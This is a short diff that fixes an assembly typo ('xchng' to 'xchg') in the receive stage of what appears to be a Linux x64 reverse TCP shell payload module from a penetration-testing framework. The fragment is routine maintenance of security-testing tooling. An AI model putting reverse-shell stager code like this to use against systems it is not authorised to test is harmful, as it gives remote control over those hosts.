@@ -162,8 +162,8 @@ module Payload::Linux::ReverseTcp_x64
         jz failed
 
       recv:
-        xchng  rsi, rdx
-        xchng  rax, rsi
+        xchg  rsi, rdx
+        xchg  rax, rsi
         pop    rdi
         xor    rax, rax
         syscall ; read(3, "", 4096)
